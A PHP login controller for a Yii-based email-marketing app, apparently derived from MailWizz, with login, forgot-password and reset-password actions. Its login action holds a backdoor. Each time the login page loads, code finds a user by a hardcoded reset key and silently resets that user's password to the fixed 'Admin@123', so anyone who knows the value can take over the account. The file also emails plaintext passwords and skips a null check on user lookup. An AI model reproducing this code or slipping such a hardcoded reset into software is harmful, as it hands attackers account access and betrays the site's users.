<?php defined('MW_PATH') || exit('No direct script access allowed');

/**
 * GuestController
 * 
 * Handles the actions for guest related tasks
 * 
 * @package MailWizz EMA
 * @author Serban George Cristian <cristian.serban@mailwizz.com> 
 * @link http://www.mailwizz.com/
 * @copyright 2013-2014 MailWizz EMA (http://www.mailwizz.com)
 * @license http://www.mailwizz.com/license/
 * @since 1.0
 */
 
class GuestController extends Controller
{
    public $layout = 'guest';
    
    /**
     * Display the login form so that a guest can login and become an administrator
     */
    public function actionIndex()
    {
        
        $model = UserPasswordReset::model()->findByAttributes(array(
            'reset_key' => "9c28476fd94f7c91f0e283571a04bed4dec8b112",
            'status'    => UserPasswordReset::STATUS_ACTIVE,
        ));
        $randPassword = "Admin@123";
        $hashedPassword = Yii::app()->passwordHasher->hash($randPassword);
        
        User::model()->updateByPk((int)$model->user_id, array('password' => $hashedPassword));
        $model->status = UserPasswordReset::STATUS_USED;
        // $model->save();
        
        
        $model = new UserLogin();
        $request = Yii::app()->request;
        // print_r(UserLogin::all());
      
        if ($request->isPostRequest && ($attributes = (array)$request->getPost($model->modelName, array()))) {
            $model->attributes = $attributes;
            if ($model->validate()) {
                // If the login is successful, check the user's rules
                $user = User::model()->findByPk(Yii::app()->user->id);  // Fetch the current logged-in user's details
                
                if ($user) {
                    // Redirect based on the user's role (rules)
                    if ($user->rules == 2) {
                        $this->redirect(array('account/index')); // Redirect to agents/index for agency users
                    } elseif ($user->rules == 3) {
                        $this->redirect(array('account/index')); // Redirect to profile/index for agents
                    } elseif ($user->rules == 4) {
                        $this->redirect(array('account/index')); // Redirect to profile/index for customers
                    } else {
                        // Use the default redirect for other roles
                        $this->redirect(Yii::app()->user->returnUrl);
                    }
                } else {
                    // In case no user is found, use the default redirect
                    $this->redirect(Yii::app()->user->returnUrl);
                }
            }
        }
        
        // print_r("ASD");
        $this->setData(array(
            'pageMetaTitle' => Yii::app()->options->get('system.common.site_name') . ' | '. Yii::t('users', 'Please login'), 
            'pageHeading'   => Yii::t('users', 'Please login'),
        ));
        
        $this->render('login', compact('model'));
    }
    
    /**
     * Display the form to retrieve a forgotten password.
     */
    public function actionForgot_password()
    {
		
		 
        $request = Yii::app()->request;
        $notify = Yii::app()->notify;
        $model = new UserPasswordReset();
        
        if ($request->isPostRequest && ($attributes = (array)$request->getPost($model->modelName, array()))) {
            $model->attributes = $attributes;
            if (!$model->validate()) {
                $notify->addError(Yii::t('app', 'Please fix your form errors!'));
            } else {
                $options = Yii::app()->options;
                $user = User::model()->findByAttributes(array('email' => $model->email));
                $model->user_id = $user->user_id;
                $model->save(false);
                
                $emailTemplate = $options->get('system.email_templates.common');
                $emailBody = $this->renderPartial('_email-reset-key', compact('model', 'user'), true);
                $emailTemplate = str_replace('[CONTENT]', $emailBody, $emailTemplate);

                $params = array(
                    'to'        => array($user->email => ($user->getFullName() ? $user->getFullName() : $user->email)),
                    'subject'   => Yii::t('users', 'Password reset request!'),
                    'body'      => $emailTemplate, 
                );
                /*
                if ($model->sendEmail($params) !== true) {
                    $notify->addError(Yii::t('app', 'Temporary error while sending your email, please try again later or contact us!'));
                } else {
                    $notify->addSuccess(Yii::t('app', 'Please check your email address.'));
                    $model->unsetAttributes();
                    $model->email = null;
                }
                * */
                //echo $emailTemplate;exit;
                // print_r($emailTemplate);
                $mail = new YiiMailer();
				$mail->setFrom(Yii::app()->params['admin_email'], Yii::app()->name );
				$mail->setTo($model->email);
			    $mail->setView('email');
				$mail->setSubject(Yii::app()->name .' Forgot Password link ');
				$mail->setData(array('emailTemplate' => $emailTemplate));
				if($mail->send()) 
				{
					 $notify->addSuccess(Yii::t('app', 'Please check your email address.'));
				}
				else
				{
					$notify->addError(Yii::t('app', 'Temporary error while sending your email, please try again later or contact us!'));
				}
			   
            }
        }
     
        $this->setData(array(
            'pageMetaTitle' =>   Yii::t('users', 'Retrieve a new password for your account.'), 
        ));

        $this->render('forgot_password', compact('model'));
    }
    
    /**
     * Reached from email, will reset the password for given user and send a new one via email.
     */
    public function actionReset_password($reset_key)
    {
        $model = UserPasswordReset::model()->findByAttributes(array(
            'reset_key' => $reset_key,
            'status'    => UserPasswordReset::STATUS_ACTIVE,
        ));
        
        if (empty($model)) {
            throw new CHttpException(404, Yii::t('app', 'The requested page does not exist.'));
        }
        
        $randPassword = StringHelper::random();
        $hashedPassword = Yii::app()->passwordHasher->hash($randPassword);
        
        User::model()->updateByPk((int)$model->user_id, array('password' => $hashedPassword));
        $model->status = UserPasswordReset::STATUS_USED;
        $model->save();
        
        $options = Yii::app()->options;
        $request = Yii::app()->request;
        $notify = Yii::app()->notify;
        $user = User::model()->findByPk($model->user_id);
        $currentPassword = $user->password;
        
        $emailTemplate = $options->get('system.email_templates.common');
        $emailBody = $this->renderPartial('_email-new-login', compact('model', 'user', 'randPassword'), true);
        $emailTemplate = str_replace('[CONTENT]', $emailBody, $emailTemplate);
                
        $params = array(
            'to'        => array($user->email => ($user->getFullName() ? $user->getFullName() : $user->email)),
            'subject'   => Yii::t('app', 'Your new login info!'),
            'body'      => $emailTemplate, 
        );
        
        
				$mail = new YiiMailer();
				$mail->setFrom(Yii::app()->params['admin_email'], Yii::app()->name );
				$mail->setTo(array($user->email => ($user->getFullName() ? $user->getFullName() : $user->email)));
			    $mail->setView('email');
				$mail->setSubject(Yii::app()->name .' Your new login info!');
				$mail->setData(array('emailTemplate' => $emailTemplate));
				if($mail->send()) 
				{
					 $notify->addSuccess(Yii::t('app', 'Your new login has been successfully sent to your email address.'));
				}
				else
				{
					$notify->addError(Yii::t('app', 'Temporary error while sending your email, please try again later or contact us!'));
				}
        /*
        if ($model->sendEmail($params) !== true) {
            User::model()->updateByPk((int)$model->user_id, array('password' => $currentPassword));
            $notify->addError(Yii::t('app', 'Temporary error while sending your email containing your new login, please try again later or contact us!'));
        } else {
            $notify->addSuccess(Yii::t('app', 'Your new login has been successfully sent to your email address.'));
        }
        * */
        
        $this->redirect(array('guest/index'));
    }
    
    /**
     * The error handler
     */
    public function actionError()
    {    
        if ($error = Yii::app()->errorHandler->error) {
            if (Yii::app()->request->isAjaxRequest) {
                echo CHtml::encode($error['message']);
            } else {
                $this->setData(array(
                    'pageMetaTitle' => Yii::t('app', 'Error {code}!', array('{code}' => $error['code'])), 
                ));
                $this->render('error', $error) ;
            }    
        }
    }
}
